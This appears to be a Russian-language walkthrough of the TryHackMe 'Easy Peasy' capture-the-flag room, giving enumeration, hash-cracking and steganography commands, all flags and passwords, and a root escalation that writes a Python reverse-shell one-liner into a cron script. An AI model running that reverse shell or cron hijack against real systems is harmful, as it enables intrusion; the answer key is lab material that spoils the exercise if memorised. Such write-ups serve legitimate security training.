[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Easy Peasy](https://tryhackme.com/r/room/easypeasyctf) 

Всего 2 задания:
## Задание 1
Разверните машину, подключенную к этой задаче, и используйте nmap для ее перечисления.

MACHINE_IP

### Ответьте на вопросы ниже
Сколько портов открыто?
```commandline
nmap -sV -sC -A -p- <IP>
```
```commandline
3
```
Какая версия nginx?
```commandline
1.16.1
```
Что работает на самом высоком порту?
```commandline
Apache
```

## Задание 2
Теперь вы перечислили машину, ответили на вопросы и взломали ее!

### Ответьте на вопросы ниже
Используя GoBuster, найдите флаг 1.
```commandline
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
gobuster dir -u http://<IP>/hidden -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
проверим исходный код http://<IP>/hidden/whatever/
```commandline
curl -s http://<IP>/hidden/whatever/
echo -n "ZmxhZ3tmMXJzN19mbDRnfQ==" | base64 -d
```
```commandline
flag{f1rs7_fl4g}
```
Далее перечислим машину, что такое флаг 2?
```commandline
http://<IP>:65524/robots.txt
curl -s http://<IP>:65524/robots.txt
```
Здесь мы получаем хеш md5, его взлом
```commandline
flag{1m_s3c0nd_fl4g}
```
Взломайте хеш с помощью easypeasy.txt. Что такое флаг 3?
```commandline
curl -s http://<IP>:65524/ | grep flag
```
```commandline
flag{9fdafbd64c47471a8f54cd3fc64cd312}
```
Что такое скрытый каталог?
```commandline
curl -s http://<IP>:65524/ | grep hidden
```
Хеш — Base62, при декодировании получаем каталог
```commandline
/n0th1ng3ls3m4tt3r
```
Используя список слов, предоставленный вам в этом задании, взломайте хэш.
```commandline
curl -s http://<IP>:65524/n0th1ng3ls3m4tt3r/
echo "940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81" > hash.txt
john --wordlist=easypeasy.txt --format=GOST hash.txt
```
Какой пароль?
```commandline
mypasswordforthatjob
```
Какой пароль для входа на машину через SSH?
```commandline
wget http://<IP>:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg
steghide extract -sf binarycodepixabay.jpg 
# mypasswordforthatjob
cat secrettext.txt
```
```commandline
iconvertedmypasswordtobinary
```
Что такое флаг пользователя?
```commandline
ssh boring@<IP> -p 6498
ls -la
cat user.txt 
```
```commandline
flag{n0wits33msn0rm4l}
```

Что такое корневой флаг?
```commandline
sudo -l
cat /etc/crontab
ls -l /var/www/.mysecretcronjob.sh
cat /var/www/.mysecretcronjob.sh 
nano .mysecretcronjob.sh

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

rlwrap nc -nlvp 4444
whoami
cd /root
ll
cat .root.txt
```
```commandline
flag{63a9f0ea7bb98050796b649e85481845}
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)